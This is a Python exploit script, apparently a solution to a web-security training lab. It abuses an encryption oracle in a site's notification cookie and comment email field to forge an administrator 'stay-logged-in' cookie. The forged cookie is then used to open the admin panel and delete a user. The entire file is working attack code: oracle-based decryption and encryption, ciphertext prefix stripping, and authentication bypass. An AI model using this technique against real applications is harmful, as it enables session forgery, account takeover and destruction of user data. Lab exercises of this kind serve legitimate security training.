#!/usr/bin/env python3
import requests
import sys
import urllib3
import base64
import re
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, "html.parser")
    return soup.find("input", {"name": "csrf"})["value"]

def login(s, url, username, password):
    login_page = url + "/login"
    csrf = get_csrf_token(s, login_page)
    data = {"csrf": csrf, "username": username, "password": password, "stay-logged-in": "on"}
    r = s.post(login_page, data=data, verify=False, allow_redirects=True, proxies=proxies, timeout=10)
    if "Log out" in r.text:
        return True
    return False

def get_stay_logged_in_cookie(s):
    return s.cookies.get("stay-logged-in")

def decrypt(s, url, ciphertext):
    post_id = "1"
    cookies = dict(s.cookies)
    cookies["notification"] = ciphertext
    r = s.get(url + f"/post?postId={post_id}", cookies=cookies, verify=False, proxies=proxies, timeout=10)
    soup = BeautifulSoup(r.text, "html.parser")
    header = soup.find("header", {"class": "notification-header"})
    if header:
        return header.text.strip()
    return None

def encrypt(s, url, plaintext):
    # use the email parameter in comment POST to encrypt arbitrary data
    csrf = get_csrf_token(s, url + "/post?postId=1")
    data = {
        "csrf": csrf,
        "postId": "1",
        "comment": "test",
        "name": "test",
        "email": plaintext,
        "website": ""
    }
    r = s.post(url + "/post/comment", data=data, verify=False, allow_redirects=False, proxies=proxies, timeout=10)
    cookie = r.cookies.get("notification")
    return cookie

def strip_prefix(ciphertext, prefix_len=32):
    # url decode then base64 decode
    decoded = base64.b64decode(requests.utils.unquote(ciphertext))
    # drop the first prefix_len bytes (2 full 16-byte blocks)
    stripped = decoded[prefix_len:]
    # re-encode
    return requests.utils.quote(base64.b64encode(stripped).decode())

def delete_carlos(s, url, admin_cookie):
    print("[*] Logging in as administrator...")
    # drop session cookie, use forged stay-logged-in cookie
    s.cookies.clear()
    s.cookies.set("stay-logged-in", admin_cookie)
    r = s.get(url + "/", verify=False, proxies=proxies, timeout=10)
    if "Admin panel" not in r.text:
        print("[-] Failed to log in as administrator")
        return False
    print("[+] Logged in as administrator")
    r = s.get(url + "/admin/delete?username=carlos", verify=False, proxies=proxies, timeout=10)
    if "Congratulations" in r.text:
        print("[+] Carlos deleted - Lab solved!")
        return True
    print("[-] Failed to delete carlos")
    return False

def main():
    if len(sys.argv) != 2:
        print(f"[+] Usage: {sys.argv[0]} <URL>")
        sys.exit(0)

    s = requests.Session()
    url = sys.argv[1].strip().rstrip("/")

    if not login(s, url, "wiener", "peter"):
        print("[-] Login failed")
        return
    print("[+] Logged in as wiener")

    # step 1 -- decrypt stay-logged-in to get the timestamp
    stay_logged_in = get_stay_logged_in_cookie(s)
    print(f"[+] stay-logged-in cookie: {stay_logged_in}")
    decrypted = decrypt(s, url, stay_logged_in)
    print(f"[+] Decrypted stay-logged-in: {decrypted}")
    timestamp = decrypted.split(":")[1]
    print(f"[+] Timestamp: {timestamp}")

    # step 2 -- encrypt padded admin cookie (9 x's to make prefix fill 32 bytes)
    padded = "xxxxxxxxx" + "administrator:" + timestamp
    print(f"[+] Encrypting: {padded}")
    encrypted = encrypt(s, url, padded)
    print(f"[+] Encrypted cookie: {encrypted}")

    # step 3 -- strip the 32-byte prefix from the ciphertext
    forged = strip_prefix(encrypted, prefix_len=32)
    print(f"[+] Forged cookie: {forged}")

    # step 4 -- verify it decrypts correctly
    verified = decrypt(s, url, forged)
    print(f"[+] Verified decryption: {verified}")
    if not verified or not verified.startswith("administrator:"):
        print("[-] Forged cookie did not decrypt correctly")
        return

    # step 5 -- use forged cookie to access admin panel
    delete_carlos(s, url, forged)

if __name__ == "__main__":
    main()